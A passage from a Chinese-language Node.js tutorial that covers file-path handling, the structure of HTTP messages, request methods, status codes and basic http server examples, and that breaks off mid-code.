就是一个绝对路径</li></ul></li><li>以 <code>../</code> 开头的相对路径，例如 <code>../a/b/c</code></li></ul></li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 相对于当前路径</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./README.md'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 相对当前路径，可以省略 ./</span><span class="token comment" spellcheck="true">// 注意：加载模块中的标识路径不能省略 ./</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'README.md'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 绝对路径</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'c:/README.md'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 绝对路径，当前 js 脚本所处磁盘根目录</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/README.md'</span><span class="token punctuation">)</span></code></pre><h6 id="相对路径操作的问题"><a href="#相对路径操作的问题" class="headerlink" title="相对路径操作的问题"></a>相对路径操作的问题</h6><h6 id="相对路径到底相对于谁？"><a href="#相对路径到底相对于谁？" class="headerlink" title="相对路径到底相对于谁？"></a>相对路径到底相对于谁？</h6><h6 id="如何解决某些时候相对路径带来的问题？"><a href="#如何解决某些时候相对路径带来的问题？" class="headerlink" title="如何解决某些时候相对路径带来的问题？"></a>如何解决某些时候相对路径带来的问题？</h6><h6 id="dirname-和-filename"><a href="#dirname-和-filename" class="headerlink" title="__dirname 和 __filename"></a><code>__dirname</code> 和 <code>__filename</code></h6><p>在每个模块中，除了 <code>require</code>、<code>exports</code> 等模块成员之外，还有两个特殊的成员：</p><ul><li><code>__dirname</code> <strong>动态获取</strong> 当前文件模块所属目录的绝对路径</li><li><code>__filename</code> <strong>动态获取</strong> 当前文件的绝对路径</li></ul><blockquote><p> dirname<code>和</code>__filename` 是不受执行 node 命令所属路径影响的</p></blockquote><p>######把相对路径转换为动态的绝对路径</p><h6 id="使用-path-join-方法解决拼接的问题"><a href="#使用-path-join-方法解决拼接的问题" class="headerlink" title="使用 path.join() 方法解决拼接的问题"></a>使用 <code>path.join()</code> 方法解决拼接的问题</h6><h6 id="路径使用整理"><a href="#路径使用整理" class="headerlink" title="路径使用整理"></a>路径使用整理</h6><h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h6><ul><li><p>相对路径永远是相对于执行 node 命令所处的路径</p></li><li><p>绝对路径永远是绝对路径，<code>__dirname</code> 永远不会受影响</p></li></ul><blockquote><p>注意：模块标识路径还是相对于文件模块本身，还这里的文件操作中的相对路径规则没有关系。</p></blockquote><h2 id="第7章-Web-开发"><a href="#第7章-Web-开发" class="headerlink" title="第7章 Web 开发"></a>第7章 Web 开发</h2><p><strong>学习目标</strong></p><ul><li>理解 HTTP 协议概念</li><li>掌握 http 模块的基本使用</li></ul><h4 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h4><h6 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h6><p>HTTP是一种能够获取如 HTML 这样的网络资源的** <a href="https://developer.mozilla.org/en-US/docs/Glossary/protocol" target="_blank" rel="noopener">protocol</a>(通讯协议)。它是在 Web 上进行数据交换的基础，是一种 client-server 协议，也就是说，请求通常是由像浏览器这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。</p><p><img src="/images/Fetching_a_page.png" alt="A Web document is the composition of different resources"></p><blockquote><p>参考链接：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview</a></li></ul></blockquote><h6 id="HTTP-消息报文"><a href="#HTTP-消息报文" class="headerlink" title="HTTP 消息报文"></a>HTTP 消息报文</h6><p>HTTP消息是服务器和客户端之间交换数据的方式。有两种类型的消息︰ </p><ul><li>请求–由客户端发送用来触发一个服务器上的动作</li><li>响应–来自服务器的应答。</li></ul><p>HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。</p><p>Web 开发人员或网站管理员，很少自己手工创建这些原始的HTTP消息︰ 由软件、浏览器、 代理或  服务器完成。他们通过配置文件（用于代理服务器或服务器），API （用于浏览器）或其他接口提供HTTP消息。</p><p><img src="/images/HTTPMsg2.png" alt="From a user-, script-, or server- generated event, an HTTP/1.x msg is generated, and if HTTP/2 is in use, it is binary framed into an HTTP/2 stream, then sent."></p><p>HTTP 请求和响应具有相似的结构，由以下部分组成︰</p><ol><li>一行起始行用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。</li><li>一个可选的HTTP头集合指明请求或描述消息正文。</li><li>一个空行指示所有关于请求的元数据已经发送完毕。</li><li>一个可选的包含请求相关数据的正文 (比如HTML表单内容), 或者响应相关的文档。 正文的大小有起始行的HTTP头来指定。</li></ol><p>起始行和  HTTP 消息中的HTTP 头统称为请求头，而其有效负载被称为消息正文。</p><p><img src="/images/HTTPMsgStructure2.png" alt="Requests and responses share a common structure in HTTP"></p><h6 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h6><p><img src="/images/HTTP_Request.png" alt="A basic HTTP request"></p><p>请求由以下元素组成：</p><ul><li>一个HTTP的<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" target="_blank" rel="noopener">method</a>，经常是由一个动词像<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a> 或者一个名词像<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS" target="_blank" rel="noopener"><code>OPTIONS</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD" target="_blank" rel="noopener"><code>HEAD</code></a>来定义客户端的动作行为。通常客户端的操作都是获取资源（GET方法）或者发送<a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms" target="_blank" rel="noopener">HTML form</a>表单值（POST方法），虽然在一些情况下也会有其他操作。</li><li>要获取的资源的路径，通常是上下文中就很明显的元素资源的URL，它没有<a href="https://developer.mozilla.org/en-US/docs/Glossary/protocol" target="_blank" rel="noopener">protocol</a>（<code>http://</code>），<a href="https://developer.mozilla.org/en-US/docs/Glossary/domain" target="_blank" rel="noopener">domain</a>（<code>developer.mozilla.org</code>），或是TCP的<a href="https://developer.mozilla.org/en-US/docs/Glossary/port" target="_blank" rel="noopener">port</a>（HTTP一般在80端口）。</li><li>HTTP协议版本号。</li><li>为服务端表达其他信息的可选头部<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers</a>。</li><li>对于一些像POST这样的方法，报文的body就包含了发送的资源，这与响应报文的body类似。</li></ul><p>######## 起始行</p><p>HTTP请求是由客户端发出的消息，用来使服务器执行动作。<em>起始行 (start-line)</em> 包含三个元素：</p><ol><li><p>一个 <em>HTTP 方法</em>，一个动词 (像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT" target="_blank" rel="noopener"><code>PUT</code></a> 或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a>) 或者一个名词 (像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD" target="_blank" rel="noopener"><code>HEAD</code></a> 或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS" target="_blank" rel="noopener"><code>OPTIONS</code></a>), 描述要执行的动作. 例如, <code>GET</code> 表示要获取资源，<code>POST</code> 表示向服务器推送数据 (创建或修改资源, 或者产生要返回的临时文件)。</p></li><li><p>请求目标 (request target)，</p><p>通常是一个URL，或者是协议、端口和域名的绝对路径，通常以请求的环境为特征。请求的格式因不同的 HTTP 方法而异。它可以是：</p><ul><li>一个绝对路径，末尾跟上一个 ‘ ? ‘ 和查询字符串。这是最常见的形式，称为 <em>原始形式 (origin form)</em>，被 GET，POST，HEAD 和 OPTIONS 方法所使用。<br><code>POST / HTTP 1.1GET /background.png HTTP/1.0HEAD /test.html?query=alibaba HTTP/1.1OPTIONS /anypage.html HTTP/1.0</code></li><li>一个完整的URL，被称为 <em>绝对形式 (absolute form)</em>，主要在 GET 连接到代理时使用。<br><code>GET http://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1</code></li><li>由域名和可选端口（以<code>':'</code>为前缀）组成的 URL 的 authority component，称为 <em>authority form</em>。 仅在使用 CONNECT 建立 HTTP 隧道时才使用。<br><code>CONNECT developer.mozilla.org:80 HTTP/1.1</code></li><li><em>星号形式 (asterisk form)*，一个简单的星号`(‘</em>‘)<code>，配合 OPTIONS 方法使用，代表整个服务器。</code>OPTIONS * HTTP/1.1`</li></ul></li><li><p><em>HTTP 版本 (HTTP version</em>)<em>，</em>定义了剩余报文的结构，作为对期望的响应版本的指示符。</p></li></ol><p>######## Headers</p><p>来自请求的 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">HTTP headers</a> 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 <code>(':')</code> 和一个结构取决于 header 的值。 整个 header（包括值）由一行组成，这一行可以相当长。</p><p>有许多请求头可用，它们可以分为几组：</p><ul><li><em>General headers，</em>例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via" target="_blank" rel="noopener"><code>Via</code></a>，适用于整个报文。</li><li><em>Request headers，</em>例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent" target="_blank" rel="noopener"><code>User-Agent</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type" target="_blank" rel="noopener"><code>Accept-Type</code></a>，通过进一步的定义(例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language" target="_blank" rel="noopener"><code>Accept-Language</code></a>)，或者给定上下文(例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer" target="_blank" rel="noopener"><code>Referer</code></a>，或者进行有条件的限制 (例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None" target="_blank" rel="noopener"><code>If-None</code></a>) 来修改请求。</li><li><em>Entity headers，</em>例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length" target="_blank" rel="noopener"><code>Content-Length</code></a>，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。</li></ul><p><img src="/images/HTTP_Request_Headers2.png" alt="Example of headers in an HTTP request"></p><p>######## Body</p><p>请求的最后一部分是它的 body。不是所有的请求都有一个 body：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，通常它们不需要 body。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。</p><p>Body 大致可分为两类：</p><ul><li>Single-resource bodies，由一个单文件组成。该类型 body 由两个 header 定义： <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type" target="_blank" rel="noopener"><code>Content-Type</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length" target="_blank" rel="noopener"><code>Content-Length</code></a>.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types##multipartform-data" target="_blank" rel="noopener">Multiple-resource bodies</a>，由多部分 body 组成，每一部分包含不同的信息位。通常是和  <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms" target="_blank" rel="noopener">HTML Forms</a> 连系在一起。</li></ul><h6 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h6><p><img src="/images/HTTP_Response.png" alt="img"></p><p>响应报文包含了下面的元素：</p><ul><li>HTTP协议版本号。</li><li>一个状态码（<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" target="_blank" rel="noopener">status code</a>），来告知对应请求执行成功或失败，以及失败的原因。</li><li>一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。</li><li>HTTP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers</a>，与请求头部类似。</li><li>可选项，比起请求报文，响应报文中更常见地包含获取的资源body。</li></ul><p>######## 状态行</p><p>HTTP 响应的起始行被称作 <em>状态行</em> <em>(status line)</em>，包含以下信息：</p><ol><li><em>协议版本</em>，通常为 <code>HTTP/1.1。</code></li><li><em>状态码 (*</em>status code)*，表明请求是成功或失败。常见的状态码是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200" target="_blank" rel="noopener"><code>200</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404" target="_blank" rel="noopener"><code>404</code></a>，或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302" target="_blank" rel="noopener"><code>302</code></a>。</li><li><em>状态文本 (status text)</em>。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。</li></ol><p>一个典型的状态行看起来像这样：<code>HTTP/1.1 404 Not Found。</code></p><p>######## Headers</p><p>响应的  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">HTTP headers</a> 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (<code>':'</code>) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为单行形式。</p><p>有许多响应头可用，这些响应头可以分为几组：</p><ul><li><em>General headers，</em>例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via" target="_blank" rel="noopener"><code>Via</code></a>，适用于整个报文。</li><li><em>Response headers，</em>例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary" target="_blank" rel="noopener"><code>Vary</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges" target="_blank" rel="noopener"><code>Accept-Ranges</code></a>，提供其它不符合状态行的关于服务器的信息。</li><li><em>Entity headers</em>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length" target="_blank" rel="noopener"><code>Content-Length</code></a>，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。</li></ul><p><img src="/images/HTTP_Response_Headers2.png" alt="Example of headers in an HTTP response"></p><p>######## Body</p><p>响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/201" target="_blank" rel="noopener"><code>201</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204" target="_blank" rel="noopener"><code>204</code></a>) 的响应，通常不会有 body。</p><p>Body 大致可分为三类：</p><ul><li>Single-resource bodies，由<strong>已知</strong>长度的单个文件组成。该类型 body 由两个 header 定义：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type" target="_blank" rel="noopener"><code>Content-Type</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length" target="_blank" rel="noopener"><code>Content-Length</code></a>。</li><li>Single-resource bodies，由<strong>未知</strong>长度的单个文件组成，通过将 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener"><code>Transfer-Encoding</code></a> 设置为 <code>chunked 来</code>使用 chunks 编码。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types##multipartform-data" target="_blank" rel="noopener">Multiple-resource bodies</a>，由多部分 body 组成，每部分包含不同的信息段。但这是比较少见的。</li></ul><h6 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h6><table><thead><tr><th>请求方法</th><th>说明</th></tr></thead><tbody><tr><td>GET</td><td>GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据</td></tr><tr><td>POST</td><td>POST方法用于将实体提交到指定的资源，通常导致状态或服务器上的副作用的更改.</td></tr><tr><td>PUT</td><td>PUT方法用请求有效载荷替换目标资源的所有当前表示</td></tr><tr><td>PATCH</td><td>PATCH方法用于对资源应用部分修改</td></tr><tr><td>DELETE</td><td>DELETE方法删除指定的资源</td></tr><tr><td>HEAD</td><td>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体</td></tr><tr><td>OPTIONS</td><td>OPTIONS方法用于描述目标资源的通信选项</td></tr><tr><td>TRACE</td><td>TRACE方法沿着到目标资源的路径执行一个消息环回测试</td></tr><tr><td>CONNECT</td><td>CONNECT方法建立一个到由目标资源标识的服务器的隧道</td></tr></tbody></table><blockquote><p>参考资料：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></li></ul></blockquote><h6 id="返回结果的HTTP状态码"><a href="#返回结果的HTTP状态码" class="headerlink" title="返回结果的HTTP状态码"></a>返回结果的HTTP状态码</h6><p>######## 1xx 临时响应</p><blockquote><p>临时响应，表示临时响应并需要请求者继续执行操作的状态代码</p></blockquote><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>100</td><td><strong>继续</strong>，请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分</td></tr><tr><td>101</td><td><strong>切换协议</strong>，请求者已要求服务器切换协议，服务器已确认并准备切换</td></tr></tbody></table><p>######## 2xx 成功</p><blockquote><p>表示成功处理了请求的状态代码</p></blockquote><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td><strong>成功</strong>，服务器已成功处理了请求</td></tr><tr><td>201</td><td><strong>已创建</strong>，请求成功并且服务器创建了新的资源</td></tr><tr><td>204</td><td><strong>无内容</strong>，服务器成功处理了请求，但没有返回任何内容</td></tr><tr><td></td><td></td></tr></tbody></table><p>######## 3xx 重定向</p><blockquote><p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向</p></blockquote><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>301</td><td><strong>永久移动</strong>，请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置</td></tr><tr><td>302</td><td><strong>临时移动</strong>，服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求</td></tr><tr><td>304</td><td><strong>未修改</strong>，自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容</td></tr><tr><td>307</td><td><strong>临时重定向</strong>，服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求</td></tr></tbody></table><p>######## 4xx 请求错误</p><blockquote><p>表示请求可能出错，妨碍了服务器的处理</p></blockquote><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>400</td><td>（错误请求） 服务器不理解请求的语法。</td></tr><tr><td>401</td><td>（未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。</td></tr><tr><td>403</td><td>（禁止） 服务器拒绝请求。</td></tr><tr><td>404</td><td>（未找到） 服务器找不到请求的网页。</td></tr><tr><td>405</td><td>（方法禁用） 禁用请求中指定的方法。</td></tr><tr><td>406</td><td>（不接受） 无法使用请求的内容特性响应请求的网页。</td></tr><tr><td>407</td><td>（需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td></tr><tr><td>408</td><td>（请求超时）  服务器等候请求时发生超时。</td></tr><tr><td>409</td><td>（冲突）  服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td></tr><tr><td>410</td><td>（已删除）  如果请求的资源已永久删除，服务器就会返回此响应。</td></tr><tr><td>411</td><td>（需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。</td></tr><tr><td>412</td><td>（未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。</td></tr><tr><td>413</td><td>（请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td></tr><tr><td>414</td><td>（请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。</td></tr><tr><td>415</td><td>（不支持的媒体类型） 请求的格式不受请求页面的支持。</td></tr><tr><td>416</td><td>（请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。</td></tr><tr><td>417</td><td>（未满足期望值） 服务器未满足”期望”请求标头字段的要求。</td></tr></tbody></table><p>######## 5xx 服务器错误</p><blockquote><p>表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错</p></blockquote><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>500</td><td>（服务器内部错误）  服务器遇到错误，无法完成请求。</td></tr><tr><td>501</td><td>（尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。</td></tr><tr><td>502</td><td>（错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。</td></tr><tr><td>503</td><td>（服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td></tr><tr><td>504</td><td>（网关超时）  服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td></tr><tr><td>505</td><td>（HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。</td></tr></tbody></table><h6 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h6><blockquote><p>参考链接：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers</a></li></ul></blockquote><h4 id="电话打通，没有响应"><a href="#电话打通，没有响应" class="headerlink" title="电话打通，没有响应"></a>电话打通，没有响应</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 0. 加载 http 核心模块</span><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1. 创建服务器，得到 Server 实例</span><span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 监听客户端的 request 请求事件，设置请求处理函数</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// request.header</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到客户端的请求了'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 绑定端口号，启动服务器</span><span class="token comment" spellcheck="true">//    真正需要通信的应用程序</span><span class="token comment" spellcheck="true">//    如何从 a 计算机的 应用程序 通信到 b 计算机的 应用程序</span><span class="token comment" spellcheck="true">//    ip 地址用来定位具体的计算机</span><span class="token comment" spellcheck="true">//    port 端口号用来定位具体的应用程序</span><span class="token comment" spellcheck="true">//    联网通信的应用程序必须占用一个端口号，同一时间同一个端口号只能被一个应用程序占用</span><span class="token comment" spellcheck="true">//    开发测试的时候使用一些非默认端口，防止冲突</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running at port 3000.'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="很傻的服务器"><a href="#很傻的服务器" class="headerlink" title="很傻的服务器"></a>很傻的服务器</h4><p>Node 服务器不同于 APache，默认能力非常的简单，一切请求都需要自己来处理。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 0. 加载 http 核心模块</span><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1. 创建服务器，得到 Server 实例</span><span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 监听客户端的 request 请求事件，设置请求处理函数</span><span class="token comment" spellcheck="true">//    req 请求对象（获取客户端信息）</span><span class="token comment" spellcheck="true">//    res 响应对象（发送响应数据）</span><span class="token comment" spellcheck="true">//      end() 方法</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 发送响应数据</span>  <span class="token comment" spellcheck="true">// res.write('hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// res.write(' hello')</span>  <span class="token comment" spellcheck="true">// 数据写完之后，必须告诉客户端，我的数据发完了，你可以接收处理了</span>  <span class="token comment" spellcheck="true">// 否则客户端还是会一直等待</span>  <span class="token comment" spellcheck="true">// 结束响应，挂断电话</span>  <span class="token comment" spellcheck="true">// res.end()</span>  <span class="token keyword">const</span> client <span class="token operator">=</span> req<span class="token punctuation">.</span>socket  <span class="token comment" spellcheck="true">// 推荐</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`    您的 ip 地址：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>client<span class="token punctuation">.</span>remoteAddress<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">    您的 port 端口号：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>client<span class="token punctuation">.</span>remotePort<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 绑定端口号，启动服务器</span><span class="token comment" spellcheck="true">//    真正需要通信的应用程序</span><span class="token comment" spellcheck="true">//    如何从 a 计算机的 应用程序 通信到 b 计算机的 应用程序</span><span class="token comment" spellcheck="true">//    ip 地址用来定位具体的计算机</span><span class="token comment" spellcheck="true">//    port 端口号用来定位具体的应用程序</span><span class="token comment" spellcheck="true">//    联网通信的应用程序必须占用一个端口号，同一时间同一个端口号只能被一个应用程序占用</span><span class="token comment" spellcheck="true">//    开发测试的时候使用一些非默认端口，防止冲突</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running at port 3000.'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="根据不同-url-地址处理不同请求"><a href="#根据不同-url-地址处理不同请求" class="headerlink" title="根据不同 url 地址处理不同请求"></a>根据不同 url 地址处理不同请求</h4><p>网站中的资源都是通过 <code>url</code> 地址来定位的，所以我就可以在请求处理函数获取客户端的请求地址，然后根据不同的请求地址处理不同的响应。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 0. 加载 http 核心模块</span><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1. 创建服务器，得到 Server 实例</span><span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 监听客户端的 request 请求事件，设置请求处理函数</span><span class="token comment" spellcheck="true">//    req 请求对象（获取客户端信息）</span><span class="token comment" spellcheck="true">//    res 响应对象（发送响应数据）</span><span class="token comment" spellcheck="true">//      end() 方法</span><span class="token comment" spellcheck="true">// 任何请求都会触发 request 请求事件</span><span class="token comment" spellcheck="true">// /a /b /c /dsanjdasjk</span><span class="token comment" spellcheck="true">// req 请求对象中有一个属性：url 可以获取当前客户端的请求路径</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span 